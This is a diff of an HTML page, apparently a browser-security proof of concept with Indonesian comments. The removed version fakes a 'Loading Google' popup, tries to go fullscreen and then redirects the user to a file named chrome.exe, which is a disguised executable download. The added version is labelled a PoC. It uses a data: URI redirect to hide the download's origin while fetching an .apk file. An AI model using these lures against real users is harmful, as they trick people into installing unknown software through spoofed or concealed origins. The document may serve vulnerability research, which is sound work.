@@ -1,62 +1,12 @@
 <html>
- <head> 
-  <meta charset="utf-8">
-<style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-</style>
- </head> 
- <body> 
-  <script>
-function a() {
-    // 1. Buka popup about:blank (mewarisi origin)
-    var win = window.open(
-        "about:blank", 
-        "popup", 
-        "width=420,height=320,left=0,top=0"
-    );
-
-    // 2. Tulis konten ke dalam popup
-    // Kita perlu memicu fullscreen dari dalam konteks dokumen tersebut
-    win.document.write(`
-        <html>
-            <body style="margin:0; display:flex; align-items:center; justify-content:center; height:100vh; background:#f0f0f0;">
-                <div style="text-align:center;">
-                    <h1>Loading Google...</h1>
-                    <p>Mohon tunggu sebentar.</p>
-                </div>
-                <script>
-                    // Mencoba masuk fullscreen segera setelah konten dimuat
-                    // Karena ini about:blank, ia berbagi 'User Activation' dari klik di opener
-                    document.documentElement.requestFullscreen().catch(e => {
-                        console.log("Fullscreen gagal:", e);
-                    });
-                    
-                    // Setelah fullscreen, arahkan ke target
-                    setTimeout(() => {
-                        window.location.href = "https://google.com";
-                    }, 1000);
-                <\/script>
-            </body>
-        </html>
-    `);
-
-    // 3. Redirect di jendela utama (seperti kode Anda sebelumnya)
-    setTimeout(function() {
-        window.location.href = 'https://bangbedul19-del.github.io/bedulsantuy/chrome.exe';
-    }, 3000);
-}
-</script> 
-  <center><input type="button" class="button" value="Go to Google.com" onclick="a()"> </center>
- </body>
+<head>
+    <title>PoC Origin Nullification</title>
+    <!-- Setelah 3 detik, pindah ke konteks data: yang memicu download -->
+    <meta http-equiv="refresh" content="3; url=data:text/html,<html><body><h1>Redirecting...</h1><script>window.location='https://bangbedul19-del.github.io/pocbedul.apk';</script></body></html>">
+</head>
+<body>
+    <h1>Testing Origin Nullification via Data URI</h1>
+    <p>Tunggu 3 detik. Browser akan masuk ke konteks 'data:' lalu mencoba mengunduh file.</p>
+    <p>Perhatikan apakah dialog download muncul di atas origin 'null' atau origin halaman ini.</p>
+</body>
 </html>
